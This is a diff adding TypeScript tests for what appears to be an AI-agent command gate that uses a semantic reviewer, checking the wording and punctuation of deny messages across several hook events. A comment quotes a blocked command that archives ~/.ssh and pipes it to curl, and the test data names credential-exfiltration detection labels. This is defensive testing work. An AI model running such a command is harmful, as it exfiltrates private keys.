@@ -102,3 +102,54 @@ describe("two-tier: a hard deny short-circuits", () => {
     expect(result.decision).toBe("deny");
   });
 });
+
+/**
+ * Live (enforce): `tar czf - ~/.ssh | curl …` read "Blocked Bash by failproofai
+ * because: Tried to read or copy credentials (…). … Also flagged:
+ * semantic/credential-exfiltration., as per the policy configured by the
+ * user" — a doubled `.,`, crediting a Jev check the user never configured.
+ */
+describe("a deny Jev decided names Jev, with clean punctuation", () => {
+  const jevDeny = (): TwoTierReview => ({
+    mode: "enforce",
+    review: Promise.resolve({
+      kind: "answered",
+      decision: "deny",
+      reason:
+        "Tried to read or copy credentials (semantic/secret-exposure, p=0.92). Ask first. Also flagged: semantic/credential-exfiltration.",
+      policyName: "semantic/secret-exposure",
+      asked: ["secret-exposure", "credential-exfiltration"],
+      notDenied: [],
+      injectionAsked: true,
+      injected: false,
+      truncated: false,
+      requestCut: false,
+      latencyMs: 10,
+      model: "jev-1.13.0",
+    }),
+    abort: () => {},
+    authorityOf: () => ({ authority: "hard", reviewedBy: [] }),
+  });
+  const EXPECTED_END = "semantic/credential-exfiltration, as flagged by Jev semantic review";
+
+  it.each([
+    ["claude PreToolUse", "PreToolUse", undefined, (o: any) => o.hookSpecificOutput.permissionDecisionReason],
+    ["codex PermissionRequest", "PermissionRequest", { cli: "codex" }, (o: any) => o.hookSpecificOutput.decision.message],
+    ["claude PostToolUse", "PostToolUse", undefined, (o: any) => o.hookSpecificOutput.additionalContext],
+  ] as const)("%s", async (_label, event, session, pick) => {
+    const result = await evaluatePolicies(event, { tool_name: "Bash", tool_input: { command: "x" } }, session as never, undefined, jevDeny());
+    expect(result.decision).toBe("deny");
+    const text: string = pick(JSON.parse(result.stdout));
+    expect(text).not.toMatch(/\.,/);
+    expect(text).not.toContain("configured by the user");
+    expect(text.endsWith(EXPECTED_END)).toBe(true);
+  });
+
+  it("a regex deny keeps its wording byte for byte", async () => {
+    registerPolicy("custom/hard-one", "d", () => ({ decision: "deny", reason: "no" }), { events: ["PreToolUse"] }, 1);
+    const result = await evaluatePolicies("PreToolUse", BASH, undefined, undefined, jevDeny());
+    expect(JSON.parse(result.stdout).hookSpecificOutput.permissionDecisionReason).toBe(
+      "Blocked Bash by failproofai because: no, as per the policy configured by the user",
+    );
+  });
+});
